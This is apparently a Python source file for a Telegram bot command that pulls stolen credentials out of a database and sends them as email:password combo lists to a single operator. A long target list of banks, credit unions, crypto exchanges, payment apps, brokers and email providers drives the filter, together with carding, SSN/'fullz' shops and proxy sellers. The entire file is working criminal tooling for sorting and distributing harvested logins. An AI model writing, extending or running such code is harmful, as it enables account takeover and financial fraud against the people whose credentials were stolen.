"""
Extract domains command handler
"""
from telegram import Update
from telegram.ext import ContextTypes
from datetime import datetime
import tempfile
import os
from app.database import SessionLocal
from app.models import Credential
from .config import logger, ALLOWED_USER_ID
from .utils import get_back_button


# Target domains list for extraction
TARGET_DOMAINS = [
    "yahoo.com", "afcu", "navy", "login.microsoftonline.com", "att.net", "sbcglobal.net",
    "bellsouth.net", "airbnb.com", "fidelity.com", "t-mobile.com", "att", "comcast",
    "spectrum", "verizon", "secure.bankofamerica.com", "edu", "verified.capitalone.com",
    "netflix.com", "login.live.com", "seed", "outlook.com", "outlook.office.com", "zoho",
    "ionos", "smtp", "webmail", "cu", "bank", "bluebird", "cash.app", "proxyscrape.com",
    "chime", "go2bank.com", "privateinternetaccess.com", "remitly.com", "blackpass.biz",
    "dichvusocks.net", "dichvusocks.us", "piaproxy.com", "xoom.com", "worldremit.com",
    "cashapp.com", "veem.com", "varo.com", "booking.com", "expedia.com", "bestbuy.com",
    "target.com", "ebay.com", "westernunion.com", "coinbase.com", "affirm.com", "ulta.com",
    "priceline.com", "netspend.com", "rbcroyalbank.com", "chase.com", "citi.com",
    "wellsfargo.com", "bankofamerica.com", "usbank.com", "pnc.com", "tdameritrade.com",
    "capitalone.com", "bbvausa.com", "bbt.com", "hsbc.com", "tiaa.org", "regions.com",
    "truist.com", "ally.com", "discover.com", "deutschebank.us", "citizensbank.com",
    "synchrony.com", "citizensbankonline.com", "key.com", "firstrepublic.com", "zionsbank.com",
    "53.com", "firstcitizens.com", "bbvacompass.com", "morganstanley.com", "us.hsbc.com",
    "ubs.com", "bankofthewest.com", "svb.com", "astoriafederal.com", "everbank.com",
    "fifththird.com", "activobank.com", "bancorpsouthonline.com", "cimm2.com", "bokfinancial.com",
    "easternbank.com", "bbtc.com", "compassbank.com", "banksouthern.com", "boh.com",
    "firsttennessee.com", "bankofhawaii.com", "qnbtrust.com", "syb.com", "jssb.com",
    "umb.com", "firstmidwest.com", "psecreditunion.org", "chemicalbankmi.com", "heritagesouthbank.com",
    "pacificwesternbank.com", "securitywall.com", "mfs-group.com", "macatawabank.com",
    "flagstar.com", "trustbank.net", "nationalbank.co.uk", "ndbt.com", "wsfsbank.com",
    "rocklandtrust.com", "gatewayfunding.com", "flsimple.com", "trustco.com", "bankuniteddirect.com",
    "cornerstoneconnect.com", "cpfg.com", "bankingwithsterling.com", "svbg.com", "hbtbank.com",
    "labettebank.com", "northpointe.com", "lakecitybank.com", "iberiabank.com", "abtbank.com",
    "pnfp.com", "modernbank.com", "sbsu.com", "rmcg.com", "barclaycardus.com", "myfirstambank.com",
    "derbystategroup.com", "merrilllynch.com", "unitybank.com", "intellichoice.com", "tgcbtrny.com",
    "first-online.com", "greerstatebank.com", "fcbresource.com", "premierbankinc.com",
    "kiwibank.com", "firstsavingsbanks.com", "crescombank.com", "cboprf.com", "bankvnb.com",
    "ucbbank.com", "vantagesouth.com", "flcb.com", "cblobaltrade.com", "myswissinternationalbank.com",
    "1stcolonial.com", "zitibank.com", "community1.com", "bemg.us", "lexingtonstatebank.com",
    "navyfederal.org", "alliantcreditunion.org", "penfed.org", "becu.org", "schoolsfirstfcu.org",
    "golden1.com", "dcu.org", "sefcu.com", "patelco.org", "sccu.com", "bevocu.org",
    "rbfcu.org", "dofcu.org", "redfcu.org", "pelicanstatecu.com", "oecu.org", "nymcu.org",
    "vystarcu.org", "digitalfcu.org", "wingsfinancial.com", "securityservicefcu.org",
    "alaskausa.org", "tinkerfcu.org", "wesbanco.com", "allegacy.org", "msufcu.org",
    "onpointcu.com", "northwest.ca", "psecu.com", "hfcu.info", "american1cu.org",
    "ufirstcu.com", "ent.com", "genisyscu.org", "gncu.org", "idahounited.org",
    "nefcu.com", "knoxvillepostalcu.org", "ovbc.com", "safeamerica.com", "cacu.com",
    "aacreditunion.org", "nihfcu.org", "abecu.org", "ascend.org", "texell.org",
    "redwoodcu.org", "faaecu.org", "michiganfirst.com", "uccumo.com", "mfcu.net",
    "deltacommunitycu.com", "fourpointsfcu.org", "desertschools.org", "ttcu.com",
    "mountainamericacu.org", "honorcu.com", "cufcu.org", "sfcu.org", "onecu.org",
    "hhfcu.org", "weokie.org", "gulfcoastfcu.org", "evfcu.org", "scu.org",
    "seattlecu.com", "mscu.net", "northwestcommunity.org", "hvcu.org", "northlandcu.com",
    "allegius.org", "uwcu.org", "lanecounty.org", "affcu.org", "horizoncu.com",
    "uwcreditunion.com", "denalifcu.org", "slcu.com", "smcu.com", "gnucfcu.com",
    "eecu.org", "fundome.org", "qsidefcu.org", "sempervalensfcu.com", "metrumcu.org",
    "genesee.coop", "solvaybank.com", "swayne.com", "netbranch.appletree.us", "winnco.org",
    "myncu.com", "alleganyfirst.com", "bvcu.org", "boots.coop", "silverstatecu.com",
    "educationfirstfcu.org", "southwest66.com", "cencap.com", "viscositycu.com", "gcefcu.coop",
    "epiphany.coop", "unitedsecuritybank.com", "coastccu.org", "fire-police.com", "mountaincu.org",
    "southbridgecu.com", "bondcu.com", "binance.com", "kraken.com", "bitfinex.com",
    "bittrex.com", "huobi.com", "kucoin.com", "ftx.com", "gemini.com", "bitstamp.net",
    "gate.io", "okex.com", "coinex.com", "bybit.com", "etoro.com", "poloniex.com",
    "hitbtc.com", "coinbene.com", "bitmax.io", "upbit.com", "bitmart.com", "probit.com",
    "coinone.co.kr", "bibox.com", "liquid.com", "zb.com", "lbank.info", "bitso.com",
    "exmo.com", "coincheck.com", "stex.com", "cointiger.com", "mercatox.com", "oceanex.pro",
    "indodax.com", "coinsbit.io", "wazirx.com", "bit-z.com", "bitumbs.com", "livecoin.net",
    "bithumb.com", "coinbit.co.kr", "digifinex.com", "crex24.com", "coinegg.com",
    "hotbit.io", "coinfalcon.com", "satoexchange.com", "fatbtc.com", "coinexmarket.io",
    "cex.io", "xt.com", "bitbank.cc", "coinfinit.com", "lykke.com", "novadax.com",
    "coinfloor.co.uk", "bitvavo.com", "bitflyer.com", "btse.com", "coins.ph",
    "coinrail.co.kr", "acx.io", "biki.com", "btcmarkets.net", "allcoin.com",
    "cobinhood.com", "okcoin.com", "coinjar.com", "bitonic.nl", "omgfin.com",
    "pro.liquid.com", "coinnest.co.kr", "zebpay.com", "coinspot.com.au", "gatecoin.com",
    "bitbay.net", "simex.global", "coindcx.com", "coinmate.io", "uniswap.org",
    "pancakeswap.finance", "sushiswap.fi", "polkaswap.io", "curve.fi", "1inch.exchange",
    "aave.com", "compound.finance", "yearn.finance", "balancer.finance", "synthetix.io",
    "makerdao.com", "v2.uniswap.org", "renproject.io", "kyber.network", "chain.link",
    "augur.net", "bancor.network", "loopring.org", "paypal.com", "po.trade",
    "deltafx.com", "octafx.com", "avatrade.com", "etrade.com", "iqoption.com",
    "interactivebrokers.com", "webull.com", "tradestation.com", "zackstrade.com",
    "tastyworks.com", "schwab.com", "fxpro.com", "olymptrade.com", "alpariforex.org",
    "pipl.com", "instantcheckmate.com", "truthfinder.com", "intelius.com", "beenverified.com",
    "spyfly.com", "easydeals.gs", "bigmoney.vn", "bankomat.sc", "zela.pw", "pp24.ws",
    "entershop.st", "bestvalid.ch", "realandrare.to", "flyded.gs", "mc-store.at",
    "premiuminfo.cc", "shalom.ninja", "crd2.life", "thebulldog.vip", "epicmarket.pw",
    "911.re", "topsocks", "faceless", "LUXSOCKS", "fullzinfo.pw", "850score.biz",
    "ssndob.cc", "ssndob.club", "scanlab.cc", "ssn24.me", "orders.bz", "luxchecker",
    "robocheck", "fullzstore", "blackpass", "basetools", "autofications", "doc-shopws",
    "uklookups.pro", "findme.cm", "floodcmr.net", "fspros.info", "infodig.is",
    "3389rdp.com", "paxful.com"
]


async def extractdomains_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /extractdomains command to extract credentials from specific domains"""
    user_id = update.effective_user.id
    
    if user_id != ALLOWED_USER_ID:
        await update.message.reply_text("⛔ Unauthorized access denied.")
        return
    
    await update.message.reply_text("🔄 Extracting credentials from target domains... This may take a moment.")
    
    db = SessionLocal()
    try:
        # Create temporary file to store results
        temp_file = tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt', encoding='utf-8')
        temp_path = temp_file.name
        
        total_extracted = 0
        domain_counts = {}
        
        # Query credentials for each domain
        for domain in TARGET_DOMAINS:
            # Query with LIKE to match partial domains
            credentials = db.query(Credential).filter(
                Credential.domain.ilike(f'%{domain}%')
            ).all()
            
            if credentials:
                domain_counts[domain] = len(credentials)
                for cred in credentials:
                    # Write in email:password format
                    if cred.username and cred.password:
                        temp_file.write(f"{cred.username}:{cred.password}\n")
                        total_extracted += 1
        
        temp_file.close()
        
        if total_extracted == 0:
            await update.message.reply_text("❌ No credentials found for the specified domains.", reply_markup=get_back_button())
            os.unlink(temp_path)
            return
        
        # Create summary message
        summary = f"✅ *Extraction Complete*\n\n"
        summary += f"📊 Total credentials extracted: {total_extracted:,}\n"
        summary += f"🎯 Domains matched: {len(domain_counts)}\n\n"
        summary += f"*Top domains found:*\n"
        
        # Show top 10 domains by count
        sorted_domains = sorted(domain_counts.items(), key=lambda x: x[1], reverse=True)[:10]
        for domain, count in sorted_domains:
            summary += f"• {domain}: {count:,}\n"
        
        await update.message.reply_text(summary, parse_mode='Markdown', reply_markup=get_back_button())
        
        # Send the file
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"extracted_credentials_{timestamp}.txt"
        
        with open(temp_path, 'rb') as f:
            await update.message.reply_document(
                document=f,
                filename=filename,
                caption=f"📁 {total_extracted:,} credentials from {len(domain_counts)} domains"
            )
        
        # Clean up temp file
        os.unlink(temp_path)
        
        logger.info(f"Extracted {total_extracted} credentials for user {user_id}")
        
    except Exception as e:
        logger.error(f"Error extracting domains: {str(e)}", exc_info=True)
        await update.message.reply_text(f"❌ Error extracting credentials: {str(e)}", reply_markup=get_back_button())
    finally:
        db.close()
